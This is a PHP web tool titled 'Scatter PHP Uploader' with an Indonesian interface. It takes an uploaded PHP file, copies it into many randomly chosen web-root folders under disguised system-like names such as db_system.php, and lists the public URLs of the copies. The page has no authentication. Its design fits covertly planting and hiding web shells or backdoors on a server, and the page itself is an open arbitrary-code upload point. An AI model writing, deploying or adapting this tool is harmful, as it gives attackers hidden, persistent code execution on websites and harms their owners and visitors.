<?php
// scatter_upload_auto.php - Upload a .php file and copy it randomly into many folders with randomized names, auto-detecting Base URL.
// Quick start: php -S 0.0.0.0:8000 -t .  and open http://localhost:8000/scatter_upload_auto.php

ini_set('display_errors', '1');
error_reporting(E_ALL);

function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }

function listDirectories(string $root, bool $leafOnly): array {
    $rootReal = realpath($root);
    if ($rootReal === false || !is_dir($rootReal)) {
        throw new RuntimeException('Root directory invalid.');
    }

    $dirs = [];
    $hasSubdirs = [];

    $iter = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($rootReal, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iter as $path => $info) {
        if ($info->isDir()) {
            $dirs[$path] = true;
            $parent = dirname($path);
            if ($parent && $parent !== $path) {
                $hasSubdirs[$parent] = true;
            }
        }
    }

    if ($leafOnly) {
        $leaf = [];
        foreach (array_keys($dirs) as $d) {
            if (empty($hasSubdirs[$d])) {
                $leaf[] = $d;
            }
        }
        sort($leaf);
        return $leaf;
    }

    $all = array_keys($dirs);
    sort($all);
    return $all;
}

function ensureDirWritable(string $dir): bool {
    return is_dir($dir) && is_writable($dir);
}

function ensureUniqueFilename(string $dir, string $basename): string {
    $target = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $basename;
    if (!file_exists($target)) {
        return $basename;
    }
    $pathInfo = pathinfo($basename);
    $name = $pathInfo['filename'] ?? $basename;
    $ext = isset($pathInfo['extension']) && $pathInfo['extension'] !== '' ? '.' . $pathInfo['extension'] : '';
    $i = 1;
    do {
        $candidate = $name . '_' . $i . $ext;
        $target = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $candidate;
        if (!file_exists($target)) {
            return $candidate;
        }
        $i++;
    } while (true);
}

function buildHumanSystemNamePool(int $needed): array {
    // Generate deterministic, human-like names such as db_system.php, auth_service.php, etc.
    $prefixes = [
        'db','auth','cache','session','config','core','kernel','service','task','queue','cron','log','audit','backup','sync','mail',
        'api','user','admin','client','device','network','payment','order','product','catalog','inventory','report','stats','billing',
        'shipping','geo','image','file','upload','download','import','export','web','http','socket','stream','worker','job','scheduler',
        'monitor','health','status','security','token','oauth','sso','ldap','crypto','hash','ssl','tls','dns','ip','proxy','cdn','renderer',
        'pdf','doc','excel','csv','xml','json','yaml','parser','validator','sanitizer','filter','firewall','sandbox','docker','k8s','cluster',
        'node','replica','shard','index','search','engine','recommend','ml','ai','vision','audio','video','encoder','decoder','transcoder',
        'thumbnail','optimizer','compressor','notifier','webhook','callback','event','bus','broker','mq','kafka','rabbit','redis','memcache',
        'mysql','pgsql','sqlite','mongo','elastic','clickhouse','s3','gcs','azure','minio','restore','migrate','seed','init','setup','install',
        'upgrade','update','patch','hotfix','diagnostic','debug','trace','profile','benchmark','feature','flag','rollout','rollback','toggle',
        'access','permission','role','policy','rule','quota','limit','throttle','rate','balance','autoscale','replication','discovery','registry',
        'gateway','ingress','egress','edge','router','balancer','waf','websocket','grpc','rpc','rest','graphql','server','handler','controller',
        'manager','helper','util','cli','daemon','agent','watcher','observer','collector','crawler','scraper','indexer','aggregator','merger',
        'splitter','matcher','resolver','normalizer','enricher','analyzer','detector','classifier','segmenter','forecaster','trainer','tester',
        'evaluator','reporter','printer','mailer','sms','push','notification','inbox','outbox','listener','subscriber','publisher','producer',
        'consumer','dispatcher'
    ];
    $suffixes = [
        'system','service','manager','controller','handler','module','engine','daemon','worker','helper','client','server','core','kernel',
        'config','adapter','bridge','gateway','router','logger','monitor','scheduler','validator','parser','loader','resolver','registry',
        'factory','builder','executor','runner','processor','pipeline','queue','cache','storage','backup','sync','scanner','watcher','observer'
    ];

    $names = [];
    foreach ($prefixes as $p) {
        foreach ($suffixes as $s) {
            $names[] = $p . '_' . $s;
            if (count($names) >= $needed) {
                return array_map(fn($n) => $n . '.php', $names);
            }
        }
    }
    // If still fewer than needed, append numbered variants deterministically
    $i = 1;
    while (count($names) < $needed) {
        $names[] = 'system_module_' . $i;
        $i++;
    }
    return array_map(fn($n) => $n . '.php', $names);
}

function detectBaseUrl(): string {
    $httpsOn = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') === '443');
    $scheme = $httpsOn ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? ($_SERVER['SERVER_NAME'] ?? 'localhost');

    // If HTTP_HOST has port, keep it; else, append non-standard port
    $hasPort = (strpos($host, ':') !== false);
    if (!$hasPort) {
        $port = (int)($_SERVER['SERVER_PORT'] ?? 80);
        $isDefault = ($scheme === 'http' && $port === 80) || ($scheme === 'https' && $port === 443);
        if (!$isDefault) {
            $host .= ':' . $port;
        }
    }
    return $scheme . '://' . $host;
}

function pathToUrl(string $absPath, string $webRoot, string $baseUrl): ?string {
    $webRootReal = rtrim(str_replace('\\', '/', realpath($webRoot) ?: $webRoot), '/');
    $absNorm = str_replace('\\', '/', $absPath);
    if (strpos($absNorm, $webRootReal) === 0) {
        $rel = ltrim(substr($absNorm, strlen($webRootReal)), '/');
        return rtrim($baseUrl, '/') . '/' . str_replace(' ', '%20', $rel);
    }
    return null; // Not under web root; cannot build URL
}

function sanitizePath(string $path): string { return rtrim($path); }

$defaults = [
    'webRoot' => realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd(),
    'leafOnly' => true,
    'count' => 10,
];

$errors = [];
$result = null;
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

if ($method === 'POST') {
    try {
        if (!isset($_FILES['upload']) || !is_uploaded_file($_FILES['upload']['tmp_name'])) {
            throw new RuntimeException('Tidak ada file yang diupload.');
        }

        $root = sanitizePath($_POST['root'] ?? $defaults['webRoot']);
        $leafOnly = (($_POST['target'] ?? 'leaf') === 'leaf');
        $randomize = isset($_POST['randomize']);
        $count = (int)($_POST['count'] ?? $defaults['count']);
        if ($count < 1) $count = 1;

        $rootReal = realpath($root);
        if ($rootReal === false || !is_dir($rootReal)) {
            throw new RuntimeException('Root directory tidak ditemukan.');
        }

        // Allow only .php
        $origName = $_FILES['upload']['name'] ?? '';
        $ext = strtolower(pathinfo($origName, PATHINFO_EXTENSION));
        if ($ext !== 'php') {
            throw new RuntimeException('Hanya file .php yang diperbolehkan.');
        }

        $dirs = listDirectories($rootReal, $leafOnly);
        if (empty($dirs)) {
            throw new RuntimeException('Tidak ada folder target ditemukan.');
        }

        if ($randomize) {
            shuffle($dirs);
        }
        if ($count > count($dirs)) {
            $count = count($dirs);
        }
        $selected = array_slice($dirs, 0, $count);

        $tmpPath = $_FILES['upload']['tmp_name'];
        $copied = [];
        $skipped = [];

        $baseUrl = detectBaseUrl();
        $webRoot = $defaults['webRoot'];

        // Prepare a human name pool (>= number of selected dirs)
        $namePool = buildHumanSystemNamePool(count($selected));
        $nameIdx = 0;

        foreach ($selected as $dir) {
            if (!ensureDirWritable($dir)) {
                $skipped[] = ['dir' => $dir, 'reason' => 'Folder tidak writable'];
                continue;
            }
            // Use deterministic human-like name, ensure unique within the directory
            $baseName = $namePool[$nameIdx] ?? ('system_module_' . ($nameIdx + 1) . '.php');
            $nameIdx++;
            $fileName = ensureUniqueFilename($dir, $baseName);
            $targetPath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;

            if (@copy($tmpPath, $targetPath)) {
                $url = pathToUrl($targetPath, $webRoot, $baseUrl);
                $copied[] = ['dir' => $dir, 'file' => basename($targetPath), 'path' => $targetPath, 'url' => $url];
            } else {
                $skipped[] = ['dir' => $dir, 'reason' => 'Gagal menyalin'];
            }
        }

        $result = [
            'root' => $rootReal,
            'webRoot' => $webRoot,
            'leafOnly' => $leafOnly,
            'randomize' => $randomize,
            'count' => $count,
            'copied' => $copied,
            'skipped' => $skipped,
            'baseUrl' => $baseUrl,
        ];
    } catch (Throwable $e) {
        $errors[] = $e->getMessage();
        $result = ['errors' => $errors];
    }
}

?>
<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Scatter PHP Uploader · by RaolByte</title>
  <style>
    :root {
      --bg: #0b0f1a; /* deep blue-black */
      --card: #0f1629;
      --muted: #8aa0b5;
      --text: #e8eef5;
      --accent: #6ea8fe; /* RaolByte blue */
      --accent-2: #22d3ee; /* cyan */
      --border: #1f2a44;
      --success: #22c55e;
      --danger: #ef4444;
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      margin: 0; padding: 24px; line-height: 1.5; font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      color: var(--text); background: radial-gradient(1200px 600px at 20% -10%, rgba(110,168,254,0.15), transparent 60%),
               radial-gradient(1000px 500px at 120% 10%, rgba(34,211,238,0.1), transparent 60%), var(--bg);
    }
    .container { max-width: 1100px; margin: 0 auto; }
    .brand {
      display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px;
    }
    .brand h1 { font-size: 22px; margin: 0; letter-spacing: 0.3px; }
    .badge { color: var(--accent-2); font-weight: 600; font-size: 13px; }
    .card {
      border: 1px solid var(--border); border-radius: 16px; padding: 18px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.0));
      box-shadow: 0 10px 30px rgba(0,0,0,0.25), inset 0 1px 0 rgba(255,255,255,0.03);
    }
    .row { margin-bottom: 12px; }
    label { display: block; font-weight: 600; margin-bottom: 6px; color: var(--text); }
    input[type=text], input[type=number], input[type=file] {
      width: 100%; padding: 10px 12px; border-radius: 10px; border: 1px solid var(--border); background: #0b1220; color: var(--text);
      outline: none; transition: border-color 0.15s ease, box-shadow 0.15s ease;
    }
    input[type=text]:focus, input[type=number]:focus, input[type=file]:focus {
      border-color: var(--accent); box-shadow: 0 0 0 3px rgba(110,168,254,0.15);
    }
    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 12px; }
    .btn {
      background: linear-gradient(90deg, var(--accent), #4f80ff); color: #001223; border: none; padding: 12px 16px; border-radius: 12px; cursor: pointer;
      font-weight: 700; letter-spacing: 0.2px; box-shadow: 0 8px 20px rgba(110,168,254,0.25);
    }
    .btn:hover { filter: brightness(1.05); }
    table { border-collapse: collapse; width: 100%; font-size: 13px; overflow: hidden; border-radius: 12px; }
    th, td { border: 1px solid var(--border); padding: 8px 10px; text-align: left; }
    th { background: #101a2f; color: var(--muted); }
    code { background: #0d162a; padding: 2px 6px; border-radius: 6px; color: #b7c6d9; }
    details { margin-top: 10px; }
    summary { cursor: pointer; font-weight: 700; color: var(--accent-2); }
    .muted { color: var(--muted); font-size: 12px; }
    .footer { margin-top: 14px; color: var(--muted); font-size: 12px; text-align: center; }
    @media (max-width: 640px) {
      body { padding: 16px; }
      .btn { width: 100%; }
      th:nth-child(3), td:nth-child(3) { display: none; } /* hide path column on small screens */
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="brand">
      <h1>Scatter PHP Uploader</h1>
      <div class="badge">by RaolByte</div>
    </div>
    <div class="card">
    <h2 style="margin-top:0">Upload & Tebar File PHP (Auto Base URL)</h2>
    <form method="post" enctype="multipart/form-data">
      <div class="row">
        <label for="upload">File .php</label>
        <input type="file" id="upload" name="upload" accept=".php" required />
      </div>

      <div class="grid">
        <div>
          <label for="root">Root direktori (sesuai struktur file)</label>
          <input type="text" id="root" name="root" value="<?php echo h($defaults['webRoot']); ?>" />
          <div>Web Root terdeteksi: <code><?php echo h($defaults['webRoot']); ?></code></div>
        </div>
      </div>

      <div class="row">
        <label>Target folder</label>
        <label><input type="radio" name="target" value="leaf" checked /> Hanya folder terdalam (leaf)</label>
        <label><input type="radio" name="target" value="all" /> Semua folder</label>
      </div>

      <div class="grid">
        <div>
          <label for="count">Jumlah folder acak</label>
          <input type="number" id="count" name="count" min="1" step="1" value="<?php echo (int)$defaults['count']; ?>" />
        </div>
        <div>
          <label>&nbsp;</label>
          <label><input type="checkbox" name="randomize" checked /> Acak urutan folder</label>
        </div>
      </div>

      <div class="row">
        <button class="btn" type="submit">Upload & Sebar</button>
      </div>
    </form>

    <?php if (!empty($errors)): ?>
      <div style="color:#b00020;margin-top:10px;">
        <?php foreach ($errors as $e): ?><div>• <?php echo h($e); ?></div><?php endforeach; ?>
      </div>
    <?php endif; ?>

    <?php if ($result && isset($result['root'])): ?>
      <hr />
      <h3>Hasil</h3>
      <div class="row">
        <div><strong>Root:</strong> <code><?php echo h($result['root']); ?></code></div>
        <div><strong>Web Root:</strong> <code><?php echo h($result['webRoot']); ?></code></div>
        <div><strong>Base URL:</strong> <code><?php echo h($result['baseUrl']); ?></code></div>
        <div><strong>Target:</strong> <?php echo $result['leafOnly'] ? 'Leaf-only' : 'All directories'; ?></div>
        <div><strong>Acak:</strong> <?php echo $result['randomize'] ? 'Ya' : 'Tidak'; ?></div>
        <div><strong>Jumlah:</strong> <?php echo (int)$result['count']; ?></div>
      </div>

      <?php if (!empty($result['copied'])): ?>
        <details open>
          <summary>Berhasil (<?php echo count($result['copied']); ?>)</summary>
          <table>
            <thead><tr><th>#</th><th>Folder</th><th>Nama File</th><th>URL</th><th>Keterangan</th></tr></thead>
            <tbody>
              <?php foreach ($result['copied'] as $i => $row): ?>
                <tr>
                  <td><?php echo $i + 1; ?></td>
                  <td><code><?php echo h($row['dir']); ?></code></td>
                  <td><code><?php echo h($row['file']); ?></code></td>
                  <td>
                    <?php if (!empty($row['url'])): ?>
                      <a href="<?php echo h($row['url']); ?>" target="_blank"><?php echo h($row['url']); ?></a>
                    <?php else: ?>
                      <em>Tidak dapat dibuat (di luar web root)</em>
                    <?php endif; ?>
                  </td>
                  <td><code><?php echo h($row['path']); ?></code></td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </details>
      <?php endif; ?>

      <?php if (!empty($result['skipped'])): ?>
        <details>
          <summary>Terlewat/Skip (<?php echo count($result['skipped']); ?>)</summary>
          <table>
            <thead><tr><th>#</th><th>Folder</th><th>Alasan</th></tr></thead>
            <tbody>
              <?php foreach ($result['skipped'] as $i => $row): ?>
                <tr>
                  <td><?php echo $i + 1; ?></td>
                  <td><code><?php echo h($row['dir']); ?></code></td>
                  <td><?php echo h($row['reason']); ?></td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </details>
      <?php endif; ?>
    <?php endif; ?>
    </div>
    <div class="footer">© <?php echo date('Y'); ?> RaolByte. Built with ❤️</div>
  </div>

  <details style="margin-top:16px;">
    <summary>Cara jalanin cepat (CLI)</summary>
    <pre>php -S 0.0.0.0:8000 -t <?php echo h(getcwd()); ?></pre>
    <div>Buka di browser: <code>http://localhost:8000/scatter_upload_auto.php</code></div>
  </details>
</body>
</html>
